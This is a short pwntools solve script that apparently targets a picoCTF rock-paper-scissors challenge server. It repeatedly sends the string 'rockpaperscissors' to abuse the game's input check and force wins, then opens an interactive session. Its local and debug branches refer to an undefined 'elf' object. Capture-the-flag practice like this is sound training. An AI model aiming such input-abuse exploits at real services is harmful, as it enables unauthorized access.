#!/usr/bin/env python3

from pwn import *
import random
import sys

gs = '''
init-pwndbg
continue
'''

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("saturn.picoctf.net", 52984)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    for i in range(6):
        io.sendlineafter(b'program', b'1')
        io.sendlineafter(b'scissors):', b'rockpaperscissors')

    io.interactive()

if __name__ == "__main__":
    main()
